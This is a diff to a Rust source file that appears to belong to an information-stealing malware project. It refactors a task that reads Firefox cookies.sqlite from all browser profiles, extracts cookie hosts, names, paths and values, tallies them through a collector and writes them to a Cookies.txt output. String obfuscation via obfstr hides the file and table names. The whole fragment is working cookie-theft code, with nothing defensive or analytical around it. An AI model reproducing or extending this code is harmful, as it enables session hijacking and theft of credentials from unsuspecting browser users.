@@ -1,13 +1,14 @@
 use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, Cookie, SqliteDatabase};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 const MOZ_COOKIES_NAME: usize = 2;
 const MOZ_COOKIES_VALUE: usize = 3;
@@ -25,12 +26,13 @@ impl<'a> CookiesTask<'a> {
     }
 }
 
-impl<C: Collector> Task<C> for CookiesTask<'_> {
+impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
     parent_name!("Cookies.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
-        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("cookies.sqlite"),
             s!("moz_cookies"),
             extract_cookies_from_record
@@ -39,11 +41,11 @@ impl<C: Collector> Task<C> for CookiesTask<'_> {
         };
 
         collector.get_browser().increase_cookies_by(cookies.len());
-        let _ = to_string_and_write_all(&cookies, "\n", parent);
+        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
     }
 }
 
-fn extract_cookies_from_record(record: &dyn TableRecord) -> Option<Cookie> {
+fn extract_cookies_from_record<R: TableRecord>(record: &R) -> Option<Cookie> {
     let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?.to_owned();
     let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?.to_owned();
     let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?.to_owned();
